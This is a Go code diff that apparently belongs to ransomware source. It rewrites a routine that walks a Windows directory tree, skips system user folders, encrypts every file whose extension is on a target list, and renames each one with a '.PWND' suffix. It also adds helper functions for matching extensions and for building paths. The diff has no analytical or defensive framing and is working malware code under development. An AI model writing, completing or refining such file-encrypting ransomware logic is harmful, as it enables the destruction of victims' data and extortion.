@@ -5,7 +5,17 @@ import (
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"strings"
 )
+
+func HasMatchingExtension(filePath string, extensions []string) bool {
+	for _, ex := range extensions {
+		if filepath.Ext(filePath) == ex {
+			return true
+		}
+	}
+	return false
+}
 
 func GetFileContent(fileName string) []byte {
 	data, err := ioutil.ReadFile(fileName)
@@ -31,17 +41,25 @@ func EncryptFileName(fileName string, key []byte) string {
 	return newFileName
 }
 
-func EncryptSystem(root string, key []byte) {
+func EncryptSystem(root string, targets []string, key []byte) []string {
+	var files []string
 	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
-		if !d.IsDir() {
-			originaPath := path + d.Name()
-			newFileName := EncryptFileName(d.Name(), key)
-			newPath := path + newFileName
-			EncryptFile(originaPath, key)
-			err := os.Rename(originaPath, newPath)
-			checkError(err)
+		// Check if not a directory, and contains one of our extensions:
+		if strings.Contains(path, "\\Users\\Public\\") || strings.Contains(path, "\\Users\\Default\\") || strings.Contains(path, "\\AppData\\") {
+			return nil
+		}
+		if !d.IsDir() && HasMatchingExtension(path, targets) {
+			EncryptFile(path, key)
+			files = append(files, d.Name())
+			os.Rename(path, path+".PWND")
 		}
 		return nil
 	})
 	checkError(err)
+	return files
+}
+
+func GetFileDirectory(filePath string, fileName string) string {
+	basePath := strings.ReplaceAll(filePath, fileName, "")
+	return basePath
 }
